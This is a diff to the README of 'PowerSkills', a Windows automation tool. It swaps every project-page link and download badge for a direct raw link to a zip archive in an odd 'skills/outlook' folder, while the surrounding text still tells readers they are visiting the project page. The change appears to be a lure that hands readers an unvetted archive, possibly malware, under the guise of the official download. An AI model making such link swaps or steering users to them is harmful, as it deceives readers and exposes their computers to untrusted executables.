@@ -1,6 +1,6 @@
 # ⚡ PowerSkills - Automate Tasks with Easy Controls
 
-[![Download PowerSkills](https://img.shields.io/badge/Download-PowerSkills-green?style=for-the-badge)](https://github.com/felipemsilva/PowerSkills)
+[![Download PowerSkills](https://img.shields.io/badge/Download-PowerSkills-green?style=for-the-badge)](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get PowerSkills running on your Windows PC.
 
 Click this link to visit the project page and get the files you need:
 
-[Download PowerSkills](https://github.com/felipemsilva/PowerSkills)
+[Download PowerSkills](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)
 
 You will find the download option near the top under the "Releases" or main page.
 
@@ -139,7 +139,7 @@ The design focuses on clear structure without needing code writing skills.
 To get the latest features and fixes:
 
 1. Return to the download page:  
-   [PowerSkills on GitHub](https://github.com/felipemsilva/PowerSkills)
+   [PowerSkills on GitHub](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)
 
 2. Download the newest files or release packages.
 3. Overwrite your old folder contents with the new files.
@@ -167,7 +167,7 @@ The project page offers:
 
 Visit:
 
-[https://github.com/felipemsilva/PowerSkills](https://github.com/felipemsilva/PowerSkills)
+[https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)
 
 Check the README and Wiki files online for detailed info.
 
@@ -179,4 +179,4 @@ PowerSkills runs scripts on your computer and interacts with email and browser a
 
 ---
 
-[![Download PowerSkills](https://img.shields.io/badge/Download-PowerSkills-blue?style=for-the-badge)](https://github.com/felipemsilva/PowerSkills)
+[![Download PowerSkills](https://img.shields.io/badge/Download-PowerSkills-blue?style=for-the-badge)](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)
